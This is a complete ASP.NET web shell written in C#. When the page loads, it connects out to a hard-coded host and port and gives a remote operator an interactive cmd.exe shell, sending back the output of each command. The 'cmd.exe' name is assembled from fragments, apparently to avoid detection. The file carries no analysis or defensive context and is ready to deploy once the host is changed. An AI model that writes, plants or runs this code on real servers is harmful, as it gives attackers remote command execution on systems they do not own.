<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">

	protected void Page_Load(object sender, EventArgs e){
	
	string commandToExecute = "";
	string commandResult = "";
	const string ipAddressString = "10.10.1.23"; //CHANGE HOST
	IPAddress ipAddress = IPAddress.Parse(ipAddressString);
	const int portNum = 55789;	// CHANGE PORT
	IPEndPoint remoteEndPoint = new IPEndPoint(ipAddress, portNum);

	Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
	client.Connect(remoteEndPoint);
	sendData(client, "Hello MASTER! Give me commands! xD \n");
	while(true){
		commandToExecute = getData(client);
		if(commandToExecute[0] == '`'){
			break;
		}
		commandResult = Zirt(commandToExecute);
		sendData(client, commandResult);
		
	}
	
	client.Shutdown(SocketShutdown.Both);
	client.Close();

	}

	protected void sendData(Socket client, string message){
		string sendString = message;
		byte[] bytes = Encoding.UTF8.GetBytes(sendString.ToString());
		client.Send(bytes);
	}
	
	protected string getData(Socket client){
		byte[] receiveBuffer = new byte[128];
		client.Receive(receiveBuffer, 0, receiveBuffer.Length, SocketFlags.None);
		string bufferString = Encoding.GetEncoding("UTF-8").GetString(receiveBuffer);
		return bufferString;
	}

	string Zirt(string arg){
		ProcessStartInfo psi = new ProcessStartInfo();
		string f = "c"+"m"+"d";
		f += ".";
		f += "e";
		f += "x";
		f += "e";
		psi.FileName = f;
		psi.Arguments = "/c "+arg;
		psi.RedirectStandardOutput = true;
		psi.UseShellExecute = false;
		Process p = Process.Start(psi);
		StreamReader stmrdr = p.StandardOutput;
		string s = stmrdr.ReadToEnd();
		stmrdr.Close();
		return s;
	}
</script>
